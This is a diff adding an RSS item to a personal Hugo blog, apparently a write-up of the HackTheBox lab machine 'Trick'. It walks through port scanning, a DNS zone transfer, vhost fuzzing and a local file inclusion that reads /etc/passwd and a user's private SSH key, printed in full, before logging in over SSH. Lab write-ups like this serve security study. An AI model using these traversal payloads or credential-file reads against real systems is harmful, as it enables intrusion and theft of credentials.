@@ -5,8 +5,318 @@
         <description>Recent content in Posts on MØst Xeon</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Tue, 18 Oct 2022 20:50:11 +0300</lastBuildDate>
+        <lastBuildDate>Fri, 28 Oct 2022 13:44:37 +0300</lastBuildDate>
         <atom:link href="https://mostxeon.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Trick</title>
+            <link>https://mostxeon.github.io/posts/trick/</link>
+            <pubDate>Fri, 28 Oct 2022 13:44:37 +0300</pubDate>
+            
+            <guid>https://mostxeon.github.io/posts/trick/</guid>
+            <description>false</description>
+            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Starting with a basic tcp scan for the top 1000 ports using nmap, I got the below results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p- -A 10.10.11.166
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-28 13:47 EEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> trick.htb <span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65531</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 61ff293b36bd9dacfbde1f56884cae2d <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 9ecdf2406196ea21a6ce2602af759a78 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 7293f91158de34ad12b54b4a7364b970 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>25/tcp open  smtp    Postfix smtpd
+</span></span><span style="display:flex;"><span>|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+</span></span><span style="display:flex;"><span>53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 <span style="color:#f92672">(</span>Debian Linux<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| dns-nsid: 
+</span></span><span style="display:flex;"><span>|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.14.2
+</span></span><span style="display:flex;"><span>|_http-title: Coming Soon - Start Bootstrap Theme
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.14.2
+</span></span><span style="display:flex;"><span>Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 527.64 seconds
+</span></span></code></pre></div><p>Few ports are open including (22,25,53,80) and I can see that port 53 running a dns server is open. Usually dns services operate on udp ports I&rsquo;ll also scan top 1000 udp ports on this machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap -A -sU 10.10.11.166
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-28 14:00 EEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> trick.htb <span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.099s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed udp ports <span style="color:#f92672">(</span>port-unreach<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE         SERVICE  VERSION
+</span></span><span style="display:flex;"><span>53/udp   open          domain   ISC BIND 9.11.5-P4-5.1+deb10u7 <span style="color:#f92672">(</span>Debian Linux<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| dns-nsid: 
+</span></span><span style="display:flex;"><span>|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+</span></span><span style="display:flex;"><span>68/udp   open|filtered dhcpc
+</span></span><span style="display:flex;"><span>631/udp  open|filtered ipp
+</span></span><span style="display:flex;"><span>5353/udp open|filtered zeroconf
+</span></span><span style="display:flex;"><span>Device type: remote management|webcam|phone|general purpose|storage-misc
+</span></span><span style="display:flex;"><span>Running: Avocent embedded, AXIS embedded, Google Android 2.X, Linux 2.6.X|3.X, ZyXEL embedded
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/h:axis:207w_network_camera cpe:/o:google:android:2.2 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:2.6.17 cpe:/o:linux:linux_kernel:3.8 cpe:/h:zyxel:nsa-210
+</span></span><span style="display:flex;"><span>Too many fingerprints match this host to give specific OS details
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 49194/udp<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HOP RTT       ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   139.39 ms 10.10.16.1
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   73.82 ms  10.10.11.166
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1231.47 seconds
+</span></span></code></pre></div><h3 id="interacting-with-services">Interacting With Services</h3>
+<h4 id="port-80-tcp">Port 80 (TCP)</h4>
+<p>Navigating to the web server on port 80, I didn&rsquo;t find anything of interest.</p>
+<p><img src="main_page_port80.png" alt="Main Page Port 80"></p>
+<p>It&rsquo;s a single static page with no useful information.</p>
+<h4 id="port-53-udptcp">Port 53 (UDP/TCP)</h4>
+<p>I&rsquo;ll try first to look for <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#zone-transfer"><em>Zone Transfer</em></a> if enabled in order to get more information about the target since I don&rsquo;t even know its domain name.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ dig axfr @10.10.11.166
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.18.7-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166
+</span></span><span style="display:flex;"><span>; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; global options: +cmd
+</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#ae81ff">84</span> msec
+</span></span><span style="display:flex;"><span>;; SERVER: 10.10.11.166#53<span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>UDP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; WHEN: Fri Oct <span style="color:#ae81ff">28</span> 14:13:16 EEST <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>;; MSG SIZE  rcvd: <span style="color:#ae81ff">56</span>
+</span></span></code></pre></div><p>Howerver I didn&rsquo;t get anything useful, I&rsquo;ll try now by guessing the domain from the machine&rsquo;s name <em>trick.htb</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ dig axfr @10.10.11.166 trick.htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.18.7-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166 trick.htb
+</span></span><span style="display:flex;"><span>; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; global options: +cmd
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">604800</span> <span style="color:#ae81ff">86400</span> <span style="color:#ae81ff">2419200</span> <span style="color:#ae81ff">604800</span>
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	NS	trick.htb.
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	A	127.0.0.1
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	AAAA	::1
+</span></span><span style="display:flex;"><span>preprod-payroll.trick.htb. <span style="color:#ae81ff">604800</span> IN	CNAME	trick.htb.
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">604800</span> <span style="color:#ae81ff">86400</span> <span style="color:#ae81ff">2419200</span> <span style="color:#ae81ff">604800</span>
+</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#ae81ff">240</span> msec
+</span></span><span style="display:flex;"><span>;; SERVER: 10.10.11.166#53<span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; WHEN: Fri Oct <span style="color:#ae81ff">28</span> 14:21:21 EEST <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>;; XFR size: <span style="color:#ae81ff">6</span> records <span style="color:#f92672">(</span>messages 1, bytes 231<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>From the results above, I can see that <em>trick.htb</em> is a valid domain name, it also discloses a new domain <em>preprod-payroll.trick.htb</em>, so I&rsquo;ll add these to my <em>/etc/hosts</em> file.</p>
+<h2 id="enumerating-web-server">Enumerating Web Server</h2>
+<h3 id="vhost-enumeration">VHOST Enumeration</h3>
+<p>After some simple directory bruteforcing on <em>preprod-payroll.trick.htb</em>, I came to a dead end. The only thing I found was a login page and a <em>database</em> directory giving me a 403 forbidden, and I wasn&rsquo;t able to find any files there with the simple wordlists I use.</p>
+<p>So I had to enumerate <em>vhosts</em> looking for some hidden domains. Again using a simple wordlist from <a href="https://github.com/danielmiessler/SecLists"><em>seclists</em></a> called <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt"><em>subdomains-top1million-5000.txt</em></a> I wasn&rsquo;t able to find anything, however this time I had a clue about the manner they name their domain, it seems that they append the prefix <em>preprod-</em> to thier domain, so why not doing the same and bruteforce vhosts again using this prefix.</p>
+<ul>
+<li>
+<p>Enumerating vhosts using <a href="https://github.com/OJ/gobuster"><em>Gobuster</em></a>:</p>
+<ul>
+<li>I can create a new wordlist from <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt"><em>subdomains-top1million-5000.txt</em></a> by appending <em>preprod-</em> to each line using sed: <code>sed 's/^/preprod-/' /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &gt; new_custom_wordlist.txt</code></li>
+<li>Then use vhost flag with gobuster <code>gobuster vhost -w new_custom_wordlist.txt -u trick.htb --append-domain</code></li>
+</ul>
+</li>
+<li>
+<p>Enumerating vhosts using <a href="https://github.com/ffuf/ffuf"><em>Ffuf</em></a>:</p>
+<ul>
+<li>Here I don&rsquo;t need to create a new wordlist, but I do need to filter requests on the size because the server responds with <em>200 response code</em> on any random subdomain, so the only way to know if the subdomain is valid is by getting a different content length: <code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://trick.htb/ -H 'Host: preprod-FUZZ.trick.htb' -fs 5480</code></li>
+<li><em>Note</em>: This is the same technique that <em>gobuster vhost</em> flag uses.</li>
+</ul>
+</li>
+</ul>
+<p>I got a valid domain <em>preprod-marketing.trick.htb</em> so I&rsquo;ll add it to my <em>/etc/hosts</em> file.</p>
+<p>Navigating to this new domain, I can clearly see that it is a new website:</p>
+<p><img src="preprod-marketing.trick.htb-main-page.png" alt="preprod-marketing.trick.htb Main Page"></p>
+<h3 id="exploiting-lfi">Exploiting LFI</h3>
+<p>Navigating to one of the present tabs, I noticed <em>?page=services.html</em> GET parameter, which might indicate a possible <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"><em>LFI vulnerability</em></a>.</p>
+<p>Again, I&rsquo;ll use <a href="https://github.com/ffuf/ffuf"><em>Ffuf</em></a> to fuzz this parameter using <em>LFI</em> payloads from <a href="https://github.com/danielmiessler/SecLists"><em>seclists</em></a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>FUZZ -fs <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v1.5.0 Kali Exclusive &lt;<span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span> :: Filter           : Response size: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 153ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 225ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 86ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 85ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 85ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 96ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 97ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 98ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 98ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 88ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 99ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 90ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 90ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 91ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 93ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 94ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 100ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 105ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 119ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 122ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>920/920<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">416</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:02<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+</span></span></code></pre></div><p>And I got several hits with a payload like <code>....//....//....//....//....//....//....//etc/passwd</code>, so now I&rsquo;ll use curl to read local files from this server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>....//....//....//....//....//....//....//etc/passwd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>michael:x:1001:1001::/home/michael:/bin/bash
+</span></span></code></pre></div><h2 id="getting-user">Getting User</h2>
+<p>From <em>/etc/passwd</em> I can see that <em>michael</em> is a user on this machine, so I&rsquo;ll try to read his <em>private SSH key</em> which will usually be present in <em>/home/[username]/.ssh/id_rsa</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>....//....//....//....//....//....//....//home/michael/.ssh/id_rsa
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
+</span></span><span style="display:flex;"><span>c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
+</span></span><span style="display:flex;"><span>YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
+</span></span><span style="display:flex;"><span>4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
+</span></span><span style="display:flex;"><span>Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
+</span></span><span style="display:flex;"><span>1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
+</span></span><span style="display:flex;"><span>DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+</span></span><span style="display:flex;"><span>+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
+</span></span><span style="display:flex;"><span>hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
+</span></span><span style="display:flex;"><span>jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
+</span></span><span style="display:flex;"><span>IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
+</span></span><span style="display:flex;"><span>aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
+</span></span><span style="display:flex;"><span>KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
+</span></span><span style="display:flex;"><span>tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
+</span></span><span style="display:flex;"><span>U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
+</span></span><span style="display:flex;"><span>fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
+</span></span><span style="display:flex;"><span>PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
+</span></span><span style="display:flex;"><span>3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
+</span></span><span style="display:flex;"><span>fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
+</span></span><span style="display:flex;"><span>AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
+</span></span><span style="display:flex;"><span>In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
+</span></span><span style="display:flex;"><span>JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
+</span></span><span style="display:flex;"><span>jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
+</span></span><span style="display:flex;"><span>IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><p>And it worked, so now I&rsquo;ll be able to <em>SSH</em> into the server as user <em>michael</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>....//....//....//....//....//....//....//home/michael/.ssh/id_rsa &gt; michael_id_rsa
+</span></span><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">600</span> michael_id_rsa
+</span></span><span style="display:flex;"><span>$ ssh -i michael_id_rsa michael@trick.htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Linux trick 4.19.0-20-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Fri Oct <span style="color:#ae81ff">28</span> 17:15:31 <span style="color:#ae81ff">2022</span> from 10.10.14.105
+</span></span><span style="display:flex;"><span>michael@trick:~$ id
